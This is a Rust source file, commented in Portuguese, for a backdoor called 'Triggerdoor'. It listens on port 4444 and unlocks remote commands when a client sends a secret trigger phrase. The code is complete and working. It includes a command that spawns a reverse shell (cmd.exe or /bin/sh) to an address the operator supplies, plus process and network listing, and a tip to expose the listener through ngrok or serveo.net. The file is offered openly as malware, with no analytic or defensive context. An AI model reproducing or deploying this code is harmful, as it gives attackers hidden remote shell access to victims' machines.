use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::process::{Command, Stdio};
use std::thread;

const LISTEN_ADDR: &str = "0.0.0.0:4444";
const TRIGGER: &str = "magicword:mairink";

fn start_reverse_shell(addr: &str) -> String {
    match addr.to_socket_addrs().ok().and_then(|mut iter| iter.next()) {
        Some(remote_addr) => match TcpStream::connect(remote_addr) {
            Ok(mut stream) => {
                let shell = if cfg!(target_os = "windows") { "cmd.exe" } else { "/bin/sh" };
                let _ = Command::new(shell)
                    .stdin(Stdio::from(stream.try_clone().unwrap()))
                    .stdout(Stdio::from(stream.try_clone().unwrap()))
                    .stderr(Stdio::from(stream))
                    .spawn();
                "[+] Shell reverso conectado com sucesso.\n".to_string()
            }
            Err(e) => format!("[x] Falha ao conectar ao listener remoto: {}\n", e),
        },
        None => "[x] Endereço remoto inválido.\n".to_string(),
    }
}

fn handle_client(mut stream: TcpStream) {
    let peer = stream.peer_addr().unwrap();
    println!("[+] Conexão recebida de {}", peer);

    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut buffer = String::new();

    if reader.read_line(&mut buffer).is_ok() {
        buffer = buffer.trim().to_string();
        if buffer == TRIGGER {
            let _ = writeln!(stream, "[+] Trigger correto recebido. Modo interativo ativado...\n");
            let mut reader = BufReader::new(stream.try_clone().unwrap());

            loop {
                buffer.clear();
                if reader.read_line(&mut buffer).unwrap_or(0) == 0 {
                    break;
                }

                let command = buffer.trim();
                let response = if command.starts_with("#reverse_shell ") {
                    let addr = command.replace("#reverse_shell ", "");
                    start_reverse_shell(&addr)
                } else {
                    match command {
                        "#open_github" => open_link("https://github.com/mairinkdev"),
                        "#open_youtube" => open_link("https://youtube.com/@mairinkdev"),
                        "#processes" => run_cmd(if cfg!(windows) { "tasklist" } else { "ps" }),
                        "#netstat" => run_cmd("netstat"),
                        "#help" => get_help(),
                        _ => format!("[x] Comando não reconhecido: {}\n", command),
                    }
                };

                let _ = stream.write_all(response.as_bytes());
            }
        } else {
            let _ = writeln!(stream, "[x] Trigger incorreto. Encerrando.");
        }
    }
}

fn run_cmd(cmd: &str) -> String {
    Command::new(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_else(|e| format!("[x] Erro ao executar '{}': {}\n", cmd, e))
}

fn open_link(url: &str) -> String {
    Command::new(if cfg!(target_os = "windows") {
        "explorer.exe"
    } else {
        "xdg-open"
    })
    .arg(url)
    .output()
    .map(|_| format!("[+] Link aberto: {}\n", url))
    .unwrap_or_else(|e| format!("[x] Falha ao abrir link: {}\n", e))
}

fn get_help() -> String {
    "Comandos disponíveis:\n\
     #open_github - Abre o GitHub do Mairink\n\
     #open_youtube - Abre o canal do YouTube\n\
     #processes - Lista processos\n\
     #netstat - Mostra conexões de rede\n\
     #reverse_shell <IP:PORTA> - Inicia conexão reversa\n\
     #help - Mostra esta ajuda\n"
        .to_string()
}

fn main() {
    println!("[*] Triggerdoor escutando em {}...", LISTEN_ADDR);
    println!("[*] Use ngrok ou serveo.net para expor a porta para a internet");

    let listener = TcpListener::bind(LISTEN_ADDR).expect("Falha ao iniciar listener");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| handle_client(stream));
            }
            Err(e) => {
                eprintln!("[!] Erro de conexão: {}", e);
            }
        }
    }
}
